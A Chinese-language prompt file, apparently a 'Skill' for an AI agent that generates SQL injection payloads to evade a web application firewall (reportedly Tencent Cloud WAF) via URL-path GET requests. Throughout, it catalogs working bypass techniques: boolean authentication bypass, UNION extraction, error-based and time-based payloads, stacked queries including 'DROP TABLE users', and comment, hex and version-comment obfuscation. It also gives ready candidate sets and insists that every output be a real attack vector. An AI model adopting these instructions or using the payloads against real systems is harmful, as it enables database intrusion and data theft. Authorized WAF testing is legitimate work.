# SQL 注入语义变异 Skill（生产级 · 深度增强）

## 核心任务

基于漏洞语义理解的结果，提出具体的 SQL 注入 `part_operations`，通过改变 SQL 注入 Payload 的**攻击表达方式**来绕过 WAF，**同时必须保持真实的 SQL 攻击语义**。

**关键前提（必读）：**
- 本 Skill 输出的每个候选 Payload **必须是真实的 SQL 注入攻击向量**，不是无害测试字符串。
- 投递上下文固定为：`GET http://<ip>/<payload>` + `Host: <虚拟主机>`（腾讯云 WAF 直连测试），Payload 会被拼接到 URL 路径。
- 你不做 URL 编码，但要意识到：`/`, `?`, `#`, `%`, 空格、`&` 在 URL 路径中的特殊含义可能被传输层处理。
- 每个候选必须与其他候选**在 SQL 语义层面显著不同**——仅改变大小写、空白、括号数量不算不同。

---

## 攻击类别识别（第一步：读 base_parts 时确定）

先根据 `base_parts` 中的 `predicate`、`operator`、`comment_terminator` 判断基础 Payload 属于哪一类攻击，你的变异必须**保留同一攻击类别**：

| 攻击类别 | 典型基础 Payload | 保留特征 | 变异空间 |
|---------|-----------------|---------|---------|
| **Boolean-based（布尔盲注/认证绕过）** | `1' OR '1'='1' #` | 恒真谓词 + 注释终结 | 谓词等价改写 + 运算符切换 + 空白/注释混淆 |
| **UNION-based（联合查询）** | `' UNION SELECT 1,2,3--` | UNION + SELECT + 列数 | UNION 关键字混淆 + 列值改写 + 注释混淆 |
| **Error-based（报错注入）** | `1' AND UpdateXML(1, CONCAT(0x7e, database(), 0x7e), 1) #` | 报错函数 + 敏感信息子查询 | 函数替换（UpdateXML↔ExtractValue↔GTID_SUBSET） + 十六进制/CONCAT 变体 |
| **Time-based（时间盲注）** | `1' AND SLEEP(5) #` | 延时函数 + 条件绑定 | SLEEP↔BENCHMARK↔GET_LOCK↔RLIKE(regexp_replace...)  |
| **Stacked（堆叠查询）** | `'; DROP TABLE users--` | `;` 分号分隔 + 第二条语句 | 第二条语句改为等价 DDL/DML 或 SELECT |
| **Out-of-Band（OOB，本环境慎用）** | `LOAD_FILE(CONCAT(...))` | DNS/文件外带 | 除非基础 Payload 已用，否则不引入 |

**判定规则：**
- 基础 Payload 若含 `UNION` → UNION 类；变异不能删除 UNION，也不能改回 Boolean 类。
- 基础 Payload 若含 `SLEEP/BENCHMARK/WAITFOR` → Time 类；变异保留延时语义。
- 基础 Payload 若含 `UpdateXML/ExtractValue/GTID_SUBSET/floor(rand())` → Error 类。
- 基础 Payload 若为 `OR/AND` + 恒真/恒假谓词 → Boolean 类。

---

## URL 路径投递上下文（关键）

Payload 会被这样发送：
```
curl "http://<ip>/<payload>" -H "Host: <vhost>"
```

**URL 路径投递的语义 Payload 编写要点：**
- `/` 在路径中是分隔符——**语义 Payload 中不要包含裸 `/`**（除非是 `/**/` 注释）。如需路径内多段，考虑用 `.` 或空格。
- `?` 会终止路径开始 query string——**语义 Payload 中不要出现裸 `?`**。
- `#` 是 URL 片段起始符——**MySQL 单行注释 `#` 在 URL 路径中会被浏览器/发送器截断**；改用 `--` 或 `-- -` 或 `;%00` 或 `/*...*/`。
- 空格在 URL 路径中会被发送器编码为 `%20`，可读性差；**优先使用 `+`, `/**/`, 制表符 `\t`, 括号 `()` 替代空格**。
- `&` 在路径中一般安全，但 query 上下文可能被拆分。

**结论：SQL Payload 中的 `#` 单行注释在 URL 路径投递下会失效。生成候选时优先用 `--`（后接空格或 `+`）、`/**/`、`;%00`、`-- -` 等。**

---

## 变异层次（从浅到深，优先深层）

### L1：语义级同义替换（最浅但仍需真实攻击语义）
```
OR 1=1        → OR 2=2
OR 1=1        → OR 'a'='a'
OR 1=1        → OR 1 BETWEEN 0 AND 2
UNION SELECT  → UNION ALL SELECT
```

### L2：结构重组
```
OR 1=1 --     → OR (1)=(1) -- -
1=1           → (1)LIKE(1)
'admin'       → CONCAT('ad','min')
UNION SELECT  → UNION/**/SELECT
```

### L3：函数/子查询包装（引入中间层）
```
1=1                     → 1=(SELECT 1)
'admin'                 → (SELECT 'admin')
SLEEP(5)                → IF(1=1,SLEEP(5),0)
UpdateXML(...)          → ExtractValue(1, CONCAT(0x7e, (SELECT database()), 0x7e))
1=1                     → EXISTS(SELECT 1)
```

### L4：数据库特性 + WAF 盲区利用（最深）
```
1=1                     → 1e0=1e0                    # 科学计数法
'admin'                 → 0x61646D696E               # 十六进制字面量
'admin'                 → CHAR(97,100,109,105,110)   # 字符构造
SELECT                  → /*!50000SELECT*/           # 版本条件注释
UNION                   → /*!UNION*/ → UNI%00ON      # 内联注释 + null byte
AND                     → &&                         # 位运算等价
SLEEP(5)                → BENCHMARK(5000000,MD5(1))  # 等价延时
SLEEP(5)                → GET_LOCK('a',5)            # 锁延时
database()              → schema()                   # 同义函数
```

---

## SQL 注入变异技术目录（14 大类）

### 技术 1：谓词等价重写（Boolean 类核心）

**适用部件**：`predicate`

**恒真谓词等价形式**（`OR 1=1` 系列）：
```
1=1
1<>2
1<2, 2>1, 1<=1, 1>=1
1 BETWEEN 0 AND 2
1 IN (1)
1 IN (1,2,3)
'a' LIKE 'a'
'a' RLIKE 'a'
'a' REGEXP '^a'
NOT(1<>1)
NOT 1=2
!(1!=1)
1<=>1                       -- NULL 安全等于
IFNULL(1,0)=1
COALESCE(1,0)=1
CASE WHEN 1=1 THEN 1 END
EXISTS(SELECT 1)
(SELECT 1)=1
1|0=1                        -- 位运算
1&1=1
1^0=1
2>>1=1
LEAST(1,2)=1
GREATEST(1,0)=1
STRCMP('a','a')=0
LENGTH('a')=1
ASCII('A')=65
CHAR_LENGTH('ab')=2
POW(1,10)=1
MOD(7,2)=1
```

**恒假谓词等价形式**（`AND 1=2` / `AND 1=0` 系列）：
```
1=2, 1<>1, 0=1, NULL IS NOT NULL
1 BETWEEN 10 AND 20 (当被测值 1)
'a' LIKE 'b'
NOT 1=1
FALSE
IF(1=2,1,NULL) IS NOT NULL
```

**⛔ 禁止的"假变异"**：
- 只改变谓词中的空格（`1 = 1` ↔ `1=1`）
- 只改变谓词大小写（`Or 1=1` ↔ `OR 1=1`）
- 只调整括号数量（`(1=1)` ↔ `((1=1))`）——除非配合运算符切换或函数包装才算深层

### 技术 2：逻辑/位运算符切换

**适用部件**：`operator`

```
OR      → ||                # 需 sql_mode 不含 PIPES_AS_CONCAT
OR      → |                 # 位或（数值上下文）
AND     → &&
AND     → &                 # 位与
NOT     → !
XOR     → ^
```

**组合技巧**：切换运算符必须同时保证谓词侧值域合法（如 `OR|1=1` 与 `OR||1=1` 有细微差别）。

### 技术 3：注释终结符替换（**核心 WAF 绕过点**）

**适用部件**：`comment_terminator`

⚠ **URL 路径投递下，`#` 会被截断**。优先级：
```
-- -         (双横杠 + 空格 + 任意字符，最兼容)
-- +         (URL 中 + 会解码为空格)
--%20        (显式空格)
--%09        (制表符)
--%0a        (换行)
/*any*/      (内联注释，可跟随任意内容)
/**/         (空内联注释)
/*!50000-- */  (版本条件注释包裹)
;%00         (PHP null byte 截断，某些版本 PHP < 5.3 有效)
;--          (堆叠分号 + 注释)
;/*         (堆叠 + 未闭合内联注释，让后续被吞噬)
```

⛔ 禁止在 URL 路径下使用 `#`——这会导致 Payload 在传输时被截断为片段。

### 技术 4：空白结构替换（**高频 WAF 绕过**）

**适用部件**：`whitespace_structure`

```
空格         → /**/                        # 内联空注释
空格         → /*!50000*/                  # MySQL 版本注释
空格         → /*!*/                       # MySQL 通用注释
空格         → %20 %09 %0a %0b %0c %0d     # 各种空白字符（发送器已处理）
空格         → +                           # URL 空格等价符
空格         → ()                          # 括号包装可省略空格
                                            # 例：OR(1)=(1) 无需空格
空格         → 0x20 后跟 CAST              # 极端情况
```

**必须注意**：某些 WAF 会先 normalize 空白（把所有连续空白折叠为一个空格）——此时单纯替换无效，需要**替换空白周围的关键字或整体结构**。

### 技术 5：比较值重写（针对 `admin`, 数字，字符串）

**适用部件**：`comparison_value`

```
'admin'                → 0x61646D696E                        # HEX 字面量
'admin'                → CHAR(97,100,109,105,110)
'admin'                → CONCAT('ad','min')
'admin'                → CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))
'admin'                → UNHEX('61646D696E')
'admin'                → CAST(0x61646D696E AS CHAR)
'admin'                → REVERSE('nimda')
'admin'                → LOWER('ADMIN')
'admin'                → SUBSTRING('xadminy',2,5)

1                      → 0x1
1                      → 1e0
1                      → 1.0
1                      → b'1'
1                      → true
1                      → CAST(1 AS UNSIGNED)
1                      → LENGTH('a')
1                      → ASCII('SOH')-0  # 巧妙数值构造
```

### 技术 6：子查询包装

**适用部件**：`subquery`（新增或替换 predicate 中的值）

```
id=1              → id=(SELECT 1)
id=1              → id=(SELECT 1 FROM DUAL)
1=1               → 1=(SELECT 1)
1=1               → (SELECT 1)=(SELECT 1)
'admin'           → (SELECT 'admin')
'admin'           → (SELECT USER())              # 环境相关
database()        → (SELECT database())
version()         → (SELECT version())
version()         → (SELECT @@version)
version()         → (SELECT @@global.version)
```

### 技术 7：函数名同义替换 / 版本注释包裹

**适用部件**：`predicate`（函数出现处）

**同义函数对**：
```
database()             ↔ schema()
version()              ↔ @@version ↔ @@global.version
user()                 ↔ current_user() ↔ session_user() ↔ system_user()
SLEEP(N)               ↔ BENCHMARK(N*1e6, MD5(1)) ↔ GET_LOCK('x',N)
                       ↔ (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)
UpdateXML(...)         ↔ ExtractValue(1, CONCAT(0x7e,(SELECT ...),0x7e))
                       ↔ GTID_SUBSET(CONCAT(0x7e,(SELECT ...),0x7e),1)
                       ↔ EXP(~(SELECT * FROM(SELECT ...)a))
                       ↔ (SELECT COUNT(*),CONCAT(...,FLOOR(RAND()*2))x FROM information_schema.columns GROUP BY x)
SUBSTRING(x,a,b)       ↔ SUBSTR(x,a,b) ↔ MID(x,a,b) ↔ LEFT(RIGHT(x,-a),b)
ASCII(x)               ↔ ORD(x) ↔ HEX(x)
CONCAT(a,b)            ↔ CONCAT_WS('',a,b) ↔ a||b (需 sql_mode)
```

**版本条件注释包裹**（MySQL 特有）：
```
SELECT                 → /*!50000SELECT*/
UNION                  → /*!50000UNION*/
UNION SELECT           → /*!50000UNION*//*!50000SELECT*/
UNION SELECT           → /*!UnIoN*//*!SeLeCt*/
```

### 技术 8：UNION 结构重组（UNION 类核心）

**适用部件**：`predicate`, `join_or_union`

```
UNION SELECT 1,2,3        → UNION ALL SELECT 1,2,3
UNION SELECT 1,2,3        → UNION SELECT 1,2,3 FROM DUAL
UNION SELECT 1,2,3        → UNION(SELECT 1,2,3)
UNION SELECT 1,2,3        → UNION SELECT NULL,2,NULL
UNION SELECT 1,2,3        → UNION SELECT 1,version(),3
UNION SELECT 1,2,3        → UNION SELECT 0x31,0x32,0x33
UNION SELECT 1,2,3        → +UNION+SELECT+1,2,3           # 空格→+
UNION SELECT 1,2,3        → /*!50000UNION*/SELECT 1,2,3
UNION SELECT 1,2,3        → UNION/**/SELECT/**/1,2,3
```

### 技术 9：Case 与关键字变形

**适用部件**：任何含 SQL 关键字的部件

```
SELECT     → SeLeCt → sElEcT → SELECT → seLECT
UNION      → UnIoN → uNiOn
FROM       → FrOm → fRoM
AND / OR   → aNd / oR
INFORMATION_SCHEMA → InFoRmAtIoN_ScHeMa
```

**关键字拼接绕过**（针对某些 dumb WAF）：
```
UNION → UN/**/ION
SELECT → SEL/**/ECT
DATABASE() → DATA/**/BASE()
```

⛔ 单纯 case 变化不能作为唯一变异（后端会以 `substantive=False` 拒绝）。必须叠加另一维度（空白、注释、括号）。

### 技术 10：括号与运算优先级

**适用部件**：`predicate`

```
1=1              → (1)=(1)
1=1              → ((1)=(1))
1=1              → (1)IN(1)
1=1              → (1)IN(1,2,3)
1=1              → (1)LIKE(1)
1=1              → (1)BETWEEN(0)AND(2)
OR 1=1           → OR(1)=(1)
OR 1=1           → OR(true)
OR 1=1           → OR+(1)=(1)                # URL 空格
```

**核心价值**：括号可以在关键字与谓词间**省略空白**，直接绕过依赖空格识别的 WAF。

### 技术 11：Time-based 延时函数替换（Time 类）

**适用部件**：`predicate`（含 SLEEP/BENCHMARK 的部分）

```
SLEEP(5)                 → BENCHMARK(5000000, MD5('a'))
SLEEP(5)                 → BENCHMARK(20000000, SHA1('a'))
SLEEP(5)                 → GET_LOCK('WAFByPasser',5)
SLEEP(5)                 → (SELECT SLEEP(5))
SLEEP(5)                 → IF(1=1, SLEEP(5), 0)
SLEEP(5)                 → CASE WHEN 1=1 THEN SLEEP(5) END
SLEEP(5)                 → IFNULL(SLEEP(5),1)
SLEEP(5)                 → SLEEP(5-1+1)
SLEEP(5)                 → SLEEP(5.0)
WAITFOR DELAY '00:00:05' → WAITFOR DELAY CONCAT('00:00:0','5')  # MSSQL
pg_sleep(5)              → (SELECT pg_sleep(5))                  # PgSQL
```

### 技术 12：Error-based 报错函数替换（Error 类）

**适用部件**：`predicate`（含 UpdateXML/ExtractValue 的部分）

```
UpdateXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)
    ↔ ExtractValue(1, CONCAT(0x7e, (SELECT database()), 0x7e))
    ↔ GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e), 1)
    ↔ (SELECT 1 UNION SELECT * FROM (SELECT (SELECT database()) FROM DUAL) x)
    ↔ EXP(~(SELECT * FROM(SELECT database())x))
    ↔ (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))a
       FROM information_schema.columns GROUP BY a)
```

**内嵌信息子查询等价**：
```
(SELECT database())  ↔ (SELECT schema())  ↔ (SELECT DATABASE())
(SELECT user())      ↔ (SELECT current_user())
(SELECT version())   ↔ (SELECT @@version) ↔ (SELECT @@innodb_version)
```

### 技术 13：内联版本条件注释（MySQL 独家）

**适用部件**：`predicate` 中任何 MySQL 关键字

```
UNION           → /*!UNION*/
SELECT          → /*!SELECT*/
UNION SELECT    → /*!50000UNION*//*!50000SELECT*/
AND             → /*!AND*/
```

**注意**：`/*!NNNNN xxx*/` 中 NNNNN 必须 ≤ 当前 MySQL 版本才被执行；`50000` 覆盖 MySQL ≥ 5.0，兼容性最好。

### 技术 14：字符串拼接与断言（High 级绕过）

**适用部件**：`comparison_value`, `predicate`

```
'admin'             → 'ad' 'min'                  # 相邻字符串字面量拼接
'admin'             → 'a''dmin'                   # SQL 转义引号 拼接
'admin'             → CONCAT('a',CHAR(100),'min')
'admin'             → CONCAT(0x61,0x64,0x6d,0x69,0x6e)
'admin'='admin'     → 'admin'REGEXP'^admin$'
'admin'='admin'     → INSTR('xadminx','admin')>0
'admin'='admin'     → LOCATE('admin','xadmin')>0
'admin'='admin'     → FIND_IN_SET('admin','x,admin,y')>0
'admin'='admin'     → STRCMP('admin','admin')=0
```

---

## 攻击类别专用变异组合

### Boolean-based（认证绕过）候选生成套路

假设基础 `1' OR '1'='1' --`，5 个候选应覆盖：
1. **谓词替换**：`1' OR 'a'='a' -- -`
2. **运算符切换 + 括号**：`1' || ('1')=('1') -- -`
3. **BETWEEN 变体 + 版本注释**：`1' /*!50000OR*/ 1 BETWEEN 0 AND 2 -- -`
4. **子查询包装**：`1' OR (SELECT 1)=(SELECT 1) -- -`
5. **REGEXP + 十六进制**：`1' OR 0x61 REGEXP 0x61 -- -`

### UNION-based 候选生成套路

假设基础 `' UNION SELECT 1,2,3-- -`：
1. **UNION ALL + 版本注释**：`' /*!50000UNION*/ ALL SELECT 1,2,3-- -`
2. **列值改为 HEX**：`' UNION SELECT 0x31,0x32,0x33-- -`
3. **括号包装 UNION 子查询**：`' UNION(SELECT 1,2,3)-- -`
4. **FROM DUAL 追加**：`' UNION SELECT 1,2,3 FROM DUAL-- -`
5. **列值嵌敏感函数**：`' UNION SELECT 1,(SELECT schema()),3-- -`

### Error-based 候选生成套路

假设基础 `1' AND UpdateXML(1, CONCAT(0x7e, database(), 0x7e), 1) --`：
1. **函数替换 ExtractValue**：`1' AND ExtractValue(1, CONCAT(0x7e, database(), 0x7e))-- -`
2. **GTID_SUBSET 替代**：`1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT schema()),0x7e),1)-- -`
3. **EXP 溢出报错**：`1' AND EXP(~(SELECT*FROM(SELECT database())x))-- -`
4. **AND → &&**：`1' && ExtractValue(1,CONCAT(0x7e,version(),0x7e))-- -`
5. **子查询包装 database()**：`1' AND UpdateXML(1,CONCAT(0x7e,(SELECT database() FROM DUAL),0x7e),1)-- -`

### Time-based 候选生成套路

假设基础 `1' AND SLEEP(5) --`：
1. **BENCHMARK 替代**：`1' AND BENCHMARK(5000000,MD5('a'))-- -`
2. **GET_LOCK 替代**：`1' AND GET_LOCK('WAFByPasser',5)-- -`
3. **IF 包装**：`1' AND IF(1=1,SLEEP(5),0)-- -`
4. **CASE 包装**：`1' AND (CASE WHEN 1=1 THEN SLEEP(5) END)-- -`
5. **算术等价**：`1' AND SLEEP(3+2)-- -`

---

## 恶意内容硬性要求（后端会校验）

每个生成的候选 Payload **必须**满足下列至少一项，否则被视为无害测试而拒绝：

- [ ] 包含 SQL 关键字：`SELECT`, `UNION`, `INSERT`, `UPDATE`, `DELETE`, `DROP`, `FROM`, `WHERE`, `ORDER BY`, `GROUP BY`, `HAVING`, `EXEC`, `CASE`, `WHEN`
- [ ] 包含 SQL 逻辑运算符：`OR`, `AND`, `XOR`, `||`, `&&`, `NOT`, `!`
- [ ] 包含比较运算符 + SQL 语义值：`=`, `<>`, `!=`, `<=>`, `LIKE`, `REGEXP`, `RLIKE`, `IN`, `BETWEEN`, `IS`, `EXISTS`
- [ ] 包含 SQL 函数：`SLEEP`, `BENCHMARK`, `UpdateXML`, `ExtractValue`, `GTID_SUBSET`, `database()`, `version()`, `user()`, `schema()`, `CONCAT`, `SUBSTRING`, `ASCII`, `CHAR`, `HEX`, `LOAD_FILE`
- [ ] 包含 SQL 注释：`--`, `#`, `/*`, `*/`, `/*!*/`, `;%00`
- [ ] 包含堆叠分号 `;` + 第二条 SQL 语句

**⛔ 明确拒绝的"无害 payload"**：
- 纯数字或纯字符串（`1`, `admin`, `test`）
- 只有引号（`'`, `"`, `'"'`）
- 只有前缀无 SQL 结构（`1'`, `id=1`）
- 与基础 Payload 完全相同或仅改变空白/大小写

---

## 与其他候选的差异性硬性要求

- 每个候选的 SQL 关键谓词/函数/结构必须与**本次任务其他候选**不同。
- 每个候选必须与**祖先 Payload**（在 `ancestor_content_fingerprints` 中）不同。
- 每个候选必须与**同一 base_payload_id 下已生成的历史候选**不同（后端会做数据库级去重）。
- 若 5 个候选中有 2 个只是空白/注释符号排列差异，则视为重复，第二个会被拒绝。

**差异性检查（写完候选后自审）**：
- 谓词结构是否不同？（1=1 vs 'a'='a' vs 1 BETWEEN 0 AND 2 是"不同"）
- 使用的 SQL 关键字/函数集合是否不同？
- 注释符是否不同？（-- vs /**/ vs ;%00）
- 运算符是否不同？（OR vs || vs |）

---

## 变异原则检查清单（每轮提出操作前必查）

- [ ] 每个操作的目标部件存在且类型正确
- [ ] 不删除 required=true 的部件
- [ ] **变异后的 Payload 保留原攻击类别**（Boolean/UNION/Error/Time/Stacked）
- [ ] **变异后的 Payload 包含真实 SQL 攻击语义**（关键字/函数/运算符）
- [ ] URL 路径投递下**未使用 `#` 单行注释**（改用 `-- -`, `/**/`, `;%00`）
- [ ] URL 路径投递下**未在 payload 中放入裸 `/`、`?`**
- [ ] 至少有一个实质性 SQL 语义变化（不只是大小写/空白）
- [ ] 没有使用 URL 编码/Base64/Unicode 转义（那是编码 Agent 的职责）
- [ ] 保持了原始验证目标（如 OR 1=1 的恒真性、SLEEP 的延时性）
- [ ] 没有引入破坏性操作（DROP、DELETE、UPDATE，除非基础 Payload 就是 Stacked 类且要求这么做）
- [ ] 与本轮其他候选**在关键字/函数/结构层面**显著不同
- [ ] 优先选择 `available_directions` 中未使用的方向
- [ ] 每个候选组合了 **2 个以上**变异技术（如：谓词重写 + 注释替换 + 空白替换）
